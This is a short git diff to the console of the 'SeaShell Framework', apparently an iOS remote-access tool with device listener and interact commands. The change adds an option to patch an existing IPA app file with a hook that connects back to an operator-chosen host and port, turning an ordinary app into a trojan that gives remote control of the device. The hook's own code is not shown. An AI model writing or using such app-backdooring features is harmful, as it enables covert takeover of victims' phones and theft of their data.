@@ -37,6 +37,7 @@ from seashell.core.device import (
     Device,
     DeviceHandler,
 )
+from seashell.core.hook import Hook
 from seashell.core.ipa import IPA
 
 from seashell.lib.config import Config
@@ -111,7 +112,7 @@ class Console(cmd.Cmd):
             ('devices', 'Show connected devices.'),
             ('kill', 'Kill device by ID.'),
             ('listen', 'Start listener in background.'),
-            ('ipa', 'Generate IPA.'),
+            ('ipa', 'Generate IPA or patch existing.'),
             ('exit', 'Exit SeaShell Framework.'),
             ('help', 'Show available commands.'),
             ('interact', 'Interact with device.'),
@@ -162,6 +163,19 @@ class Console(cmd.Cmd):
 
         :return None: None
         """
+
+        patch = self.badges.input_question("Patch existing IPA [y/N]: ")
+
+        if patch.lower() in ['y', 'yes']:
+            ipa = self.badges.input_arrow("Path to IPA file: ")
+            host = self.badges.input_arrow("Host to connect back: ")
+            port = self.badges.input_arrow("Port to connect back: ")
+
+            hook = Hook(host, port)
+            hook.patch_ipa(ipa)
+
+            self.print_success(f"IPA at {ipa} patched!")
+            return
 
         name = self.badges.input_arrow("Application name (Mussel): ")
         name = name or 'Mussel'
